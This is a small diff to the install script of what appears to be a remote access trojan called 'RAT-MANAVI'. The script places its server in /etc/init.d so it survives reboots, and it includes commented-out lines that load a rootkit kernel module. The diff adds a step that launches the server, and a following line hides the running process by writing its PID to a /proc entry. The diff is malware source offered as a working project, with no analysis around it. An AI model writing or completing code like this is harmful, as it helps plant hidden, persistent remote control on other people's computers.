@@ -67,6 +67,9 @@ ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
 #cd $RAT_DIR''RAT-MANAVI/rootkit/
 #$INSMOD rootkit.ko
 
+#Ejecutar el server.py
+$RAT_DIR''/RAT-MANAVI/server.py
+
 #Ocultar proceso
 echo "hpid $$" > /proc/buddyinfo 2>/dev/null
 
